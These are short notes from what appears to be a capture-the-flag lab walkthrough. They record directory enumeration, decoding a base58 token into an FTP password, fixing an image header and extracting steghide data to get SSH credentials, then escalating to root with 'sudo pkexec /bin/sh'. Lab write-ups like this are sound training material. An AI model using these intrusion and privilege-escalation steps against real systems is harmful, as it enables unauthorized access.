21  
22  
80  
111 RPC #100000
 
nikto and dirb find nothing.  
gobuster:
 
/island/  
vigilante  
/island/2100/  
.ticket  
gobuster dir -u 10.10.10.10. -w directory.txt -x .ticket  
green_arrow.ticket
 
wget [http://10.10.10.10/island/2100/green_arrow.ticket](http://10.10.10.10/island/2100/green_arrow.ticket)
 
This is just a token to get into Queen's Gambit(Ship)  
RTy8yhBQdscX
 
cyberchef, base58  
!#th3h00d
 
ftp  
vigilante  
!#th3h00d
 
get the pics  
user "slade" found
 
exiftool on pics, see Leave_me_alone has fil type error; change magic number to png magic number in hexeditor  
password
 
steghide extract -sf aa.jpg  
:password
 
M3tahuman
 
ssh slade:M3tahuman
 
sudo -l  
sudo pkexec /bin/sh  
/root/root.txt